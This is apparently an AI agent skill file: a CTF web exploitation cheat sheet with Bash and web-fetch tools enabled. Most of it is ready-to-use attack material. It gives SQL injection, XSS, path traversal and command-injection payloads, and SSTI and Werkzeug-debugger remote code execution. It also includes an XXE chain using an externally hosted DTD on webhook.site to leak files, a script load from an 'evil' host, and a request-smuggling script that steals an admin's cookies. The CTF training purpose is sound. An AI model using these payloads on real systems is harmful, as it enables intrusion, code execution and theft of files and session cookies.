---
name: ctf-web
description: Web exploitation techniques for CTF challenges. Use when solving web security challenges involving XSS, SQLi, CSRF, file upload bypasses, JWT attacks, Web3/blockchain exploits, or other web vulnerabilities.
license: MIT
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch
metadata:
  user-invocable: "false"
---

# CTF Web Exploitation

Quick reference for web CTF challenges. Each technique has a one-liner here; see supporting files for full details with payloads and code.

## Additional Resources

- [server-side.md](server-side.md) - Server-side attacks: SQLi, SSTI, SSRF, XXE, command injection, code injection (Ruby/Perl/Python), ReDoS, file write→RCE, eval bypass
- [client-side.md](client-side.md) - Client-side attacks: XSS, CSRF, CSPT, cache poisoning, DOM tricks, React input filling, hidden elements
- [auth-and-access.md](auth-and-access.md) - Auth/authz attacks: JWT, session, password inference, weak validation, client-side gates, NoSQL auth bypass
- [node-and-prototype.md](node-and-prototype.md) - Node.js: prototype pollution, VM sandbox escape, Happy-DOM chain, flatnest CVE
- [web3.md](web3.md) - Blockchain/Web3: Solidity exploits, proxy patterns, ABI encoding tricks, Foundry tooling
- [cves.md](cves.md) - CVE-specific exploits: Next.js middleware bypass, curl credential leak, Uvicorn CRLF, urllib scheme bypass

---

## Reconnaissance

- View source for HTML comments, check JS/CSS files for internal APIs
- Look for `.map` source map files
- Check response headers for custom X- headers and auth hints
- Common paths: `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/admin`, `/api`, `/debug`, `/.git/`, `/.env`
- Search JS bundles: `grep -oE '"/api/[^"]+"'` for hidden endpoints
- Check for client-side validation that can be bypassed
- Compare what the UI sends vs. what the API accepts (read JS bundle for all fields)

## SQL Injection Quick Reference

**Detection:** Send `'` — syntax error indicates SQLi

```
' OR '1'='1                    # Classic auth bypass
' OR 1=1--                     # Comment termination
username=\&password= OR 1=1--  # Backslash escape quote bypass
' UNION SELECT sql,2,3 FROM sqlite_master--  # SQLite schema
0x6d656f77                     # Hex encoding for 'meow' (bypass quotes)
```

See [server-side.md](server-side.md) for second-order SQLi, LIKE brute-force, SQLi→SSTI chains.

## XSS Quick Reference

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Filter bypass: hex `\x3cscript\x3e`, entities `&#60;script&#62;`, case mixing `<ScRiPt>`, event handlers.

See [client-side.md](client-side.md) for DOMPurify bypass, cache poisoning, CSPT, React input tricks.

## Path Traversal / LFI Quick Reference

```
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**Python footgun:** `os.path.join('/app/public', '/etc/passwd')` returns `/etc/passwd`

## JWT Quick Reference

1. `alg: none` — remove signature entirely
2. Algorithm confusion (RS256→HS256) — sign with public key
3. Weak secret — brute force with hashcat/flask-unsign
4. Key exposure — check `/api/getPublicKey`, `.env`, `/debug/config`
5. Balance replay — save JWT, spend, replay old JWT, return items for profit

See [auth-and-access.md](auth-and-access.md) for full JWT attacks and session manipulation.

## SSTI Quick Reference

**Detection:** `{{7*7}}` returns `49`

```python
# Jinja2 RCE
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Go template
{{.ReadFile "/flag.txt"}}
# EJS
<%- global.process.mainModule.require('child_process').execSync('id') %>
```

## SSRF Quick Reference

```
127.0.0.1, localhost, 127.1, 0.0.0.0, [::1]
127.0.0.1.nip.io, 2130706433, 0x7f000001
```

DNS rebinding for TOCTOU: https://lock.cmpxchg8b.com/rebinder.html

## Command Injection Quick Reference

```bash
; id          | id          `id`          $(id)
%0aid         # Newline     127.0.0.1%0acat /flag
```

When cat/head blocked: `sed -n p flag.txt`, `awk '{print}'`, `tac flag.txt`

## XXE Quick Reference

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

PHP filter: `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">`

## Code Injection Quick Reference

**Ruby `instance_eval`:** Break string + comment: `VALID');INJECTED_CODE#`
**Perl `open()`:** 2-arg open allows pipe: `|command|`
**JS `eval` blocklist bypass:** `row['con'+'structor']['con'+'structor']('return this')()`
**PHP deserialization:** Craft serialized object in cookie → LFI/RCE

See [server-side.md](server-side.md) for full payloads and bypass techniques.

## Node.js Quick Reference

**Prototype pollution:** `{"__proto__": {"isAdmin": true}}` or flatnest circular ref bypass
**VM escape:** `this.constructor.constructor("return process")()` → RCE
**Full chain:** pollution → enable JS eval in Happy-DOM → VM escape → RCE

**Prototype pollution permission bypass (Server OC, Pragyan 2026):**
```bash
# When Express.js endpoint checks req.body.isAdmin or similar:
curl -X POST -H 'Content-Type: application/json' \
  -d '{"Path":"value","__proto__":{"isAdmin":true}}' \
  'https://target/endpoint'
# __proto__ pollutes Object.prototype, making isAdmin truthy on all objects
```
**Key insight:** Always try `__proto__` injection on JSON endpoints, even when the vulnerability seems like something else (race condition, SSRF, etc.).

See [node-and-prototype.md](node-and-prototype.md) for detailed exploitation.

## Auth & Access Control Quick Reference

- Cookie manipulation: `role=admin`, `isAdmin=true`
- Host header bypass: `Host: 127.0.0.1`
- Hidden endpoints: search JS bundles for `/api/internal/`, `/api/admin/`
- Client-side gates: `window.overrideAccess = true` or call API directly
- Password inference: profile data + structured ID format → brute-force
- Weak signature: check if only first N chars of hash are validated

See [auth-and-access.md](auth-and-access.md) for full patterns.

## File Upload → RCE

- `.htaccess` upload: `AddType application/x-httpd-php .lol` + webshell
- Gogs symlink: overwrite `.git/config` with `core.sshCommand` RCE
- Python `.so` hijack: write malicious shared object + delete `.pyc` to force reimport
- ZipSlip: symlink in zip for file read, path traversal for file write
- Log poisoning: PHP payload in User-Agent + path traversal to include log

See [server-side.md](server-side.md) for detailed steps.

## Multi-Stage Chain Patterns

**0xClinic chain:** Password inference → path traversal + ReDoS oracle (leak secrets from `/proc/1/environ`) → CRLF injection (CSP bypass + cache poisoning + XSS) → urllib scheme bypass (SSRF) → `.so` write via path traversal → RCE

**Key chaining insights:**
- Path traversal + any file-reading primitive → leak `/proc/*/environ`, `/proc/*/cmdline`
- CRLF in headers → CSP bypass + cache poisoning + XSS in one shot
- Arbitrary file write in Python → `.so` hijacking or `.pyc` overwrite for RCE
- Lowercased response body → use hex escapes (`\x3c` for `<`)

## Useful Tools

```bash
sqlmap -u "http://target/?id=1" --dbs       # SQLi
ffuf -u http://target/FUZZ -w wordlist.txt   # Directory fuzzing
flask-unsign --decode --cookie "eyJ..."      # JWT decode
hashcat -m 16500 jwt.txt wordlist.txt        # JWT crack
dalfox url http://target/?q=test             # XSS
```

## Flask/Werkzeug Debug Mode Exploitation

**Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.

**Attack chain:**
1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
   ```bash
   flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
   # Or brute-force programmatically:
   for word in wordlist:
       try:
           data = decode_flask_cookie(cookie, word)
           print(f"Secret: {word}, Data: {data}")
       except: pass
   ```
2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
   ```bash
   flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
   ```
3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request

**Werkzeug debugger RCE:** If `/console` is accessible, generate PIN:
- Read `/proc/self/environ`, `/sys/class/net/eth0/address`, `/proc/sys/kernel/random/boot_id`
- Compute PIN using Werkzeug's algorithm
- Execute arbitrary Python in debugger console

## XXE with External DTD Filter Bypass

**Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.

**Technique:** Host malicious DTD on webhook.site or attacker server:
```xml
<!-- Remote DTD (hosted on webhook.site) -->
<!ENTITY % data SYSTEM "file:///app/flag.txt">
<!ENTITY leak "%data;">
```

```xml
<!-- Uploaded XML (clean, passes filter) -->
<?xml version="1.0"?>
<!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
<book><title>&leak;</title></book>
```

**Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.

**Setup with webhook.site API:**
```python
import requests
TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
             json={"default_content": dtd, "default_content_type": "text/xml"})
```

## JSFuck Decoding

**Pattern (JShit, PascalCTF 2026):** Page source contains JSFuck (`[]()!+` only). Decode by removing trailing `()()` and calling `.toString()` in Node.js:
```javascript
const code = fs.readFileSync('jsfuck.js', 'utf8');
// Remove last () to get function object instead of executing
const func = eval(code.slice(0, -2));
console.log(func.toString());  // Reveals original code with hardcoded flag
```

## Shadow DOM XSS (Pragyan 2026)

**Closed Shadow DOM exfiltration:** Wrap `attachShadow` in a Proxy to capture shadow root references:
```javascript
var _r, _o = Element.prototype.attachShadow;
Element.prototype.attachShadow = new Proxy(_o, {
  apply: (t, a, b) => { _r = Reflect.apply(t, a, b); return _r; }
});
// After target script creates shadow DOM, _r contains the root
```

**Indirect eval scope escape:** `(0,eval)('code')` escapes `with(document)` scope restrictions.

**Payload smuggling via avatar URL:** Encode full JS payload in avatar URL after fixed prefix, extract with `avatar.slice(N)`:
```html
<svg/onload=(0,eval)('eval(avatar.slice(24))')>
```

**`</script>` injection (Shadow Fight 2):** Keyword filters often miss HTML structural tags. `</script>` closes existing script context, `<script src=//evil>` loads external script. External script reads flag from `document.scripts[].textContent`.

## DOM Clobbering + MIME Mismatch (Pragyan 2026)

**MIME type confusion:** CDN/server checks for `.jpeg` but not `.jpg` → serves `.jpg` as `text/html` → HTML in JPEG polyglot executes as page.

**Form-based DOM clobbering:**
```html
<form id="config"><input name="canAdminVerify" value="1"></form>
<!-- Makes window.config.canAdminVerify truthy, bypassing JS checks -->
```

## HTTP Request Smuggling via Cache Proxy (Pragyan 2026)

**Cache proxy desync:** When a caching TCP proxy returns cached responses without consuming request bodies, leftover bytes are parsed as the next request.

**Cookie theft pattern:**
1. Create cached resource (e.g., blog post)
2. Send request with cached URL + appended incomplete POST (large Content-Length, partial body)
3. Cache proxy returns cached response, doesn't consume POST body
4. Admin bot's next request bytes fill the POST body → stored on server
5. Read stored request to extract admin's cookies

```python
inner_req = (
    f"POST /create HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    f"Cookie: session={user_session}\r\n"
    f"Content-Length: 256\r\n"  # Large, but only partial body sent
    f"\r\n"
    f"content=LEAK_"  # Victim's request completes this
)
outer_req = (
    f"GET /cached-page HTTP/1.1\r\n"
    f"Content-Length: {len(inner_req)}\r\n"
    f"\r\n"
).encode() + inner_req
```

## Path Traversal: URL-Encoded Slash Bypass (Pragyan 2026)

**`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
```bash
curl 'https://target/public%2f../nginx.conf'
# Nginx sees "/public%2f../nginx.conf" → matches /public/ route
# Filesystem resolves to /public/../nginx.conf → /nginx.conf
```
**Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.

## Common Flag Locations

```
/flag.txt, /flag, /app/flag.txt, /home/*/flag*
Environment variables: /proc/self/environ
Database: flag, flags, secret tables
Response headers: x-flag, x-archive-tag, x-proof
Hidden DOM: display:none elements, data attributes
```
